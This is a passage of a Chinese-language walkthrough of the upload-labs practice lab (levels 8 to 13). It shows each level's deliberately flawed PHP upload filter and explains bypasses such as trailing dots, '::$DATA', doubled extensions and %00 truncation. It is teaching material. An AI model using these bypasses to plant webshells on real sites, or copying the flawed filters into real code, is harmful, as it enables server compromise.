class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>黑名单,去空格并且转换为小写,但是忽略了<code>.</code>,文件名尾加.绕过<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151403275.png?token=ARYCSAQ4CCYTTO62P7LIVTLCQCL7A"></p></li></ul><h1 id="pass-09"><a href="#pass-09" class="headerlink" title="pass-09"></a>pass-09</h1><ul><li>源码</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>上传<br>在上关的基础上去掉了. 使用特殊字符绕过<code>::$DATA</code><br>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名，且保持”::$DATA”之前的文件名 他的目的就是不检查后缀名。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151403711.png?token=ARYCSAS4OEIOWU727AX56T3CQCMAE"></li></ul><h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>上传<br>在上一关的基础上,禁止::$DATA,但是<code>deldot()</code>函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br> 使用pass-05的第二种方法,<code>. .</code>绕过</p></li></ul><h1 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>,<span class="string">&quot;ini&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>删除黑名单中的关键字但是只检测一次,使用双写绕过<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151404428.png?token=ARYCSAUS5VMFYNA5CYFGISDCQCMB2"></p></li></ul><p>上传之后得到文件名shell.php</p><h1 id="pass-12"><a href="#pass-12" class="headerlink" title="pass-12"></a>pass-12</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>上传<br>白名单,最后的路径是靠拼接,可以使用%00截断<br>原理：php的一些函数的底层是C语言，而move_uploaded_file就是其中之一，遇到0x00会截断，0x表示16进制，URL中%00解码成16进制就是0x00。</p></li></ul><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151404815.png?token=ARYCSAQVS4V5C33H5LH4ZFTCQCMCS"></p><h1 id="pass-13"><a href="#pass-13" class="headerlink" title="pass-13"></a>pass-13</h1><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传失败&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>上传<br>与上关一样,区别是post提交,post不会对里面的数据自动解码，需要在Hex中修改。<br><img src="https://raw.githubusercontent.com/chencicici/images/main/202205151404058.png?token=ARYCSAVQMXGSSV33V76KGCLCQCMEA"></p></li></ul><p>#pass-14</p><ul><li><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 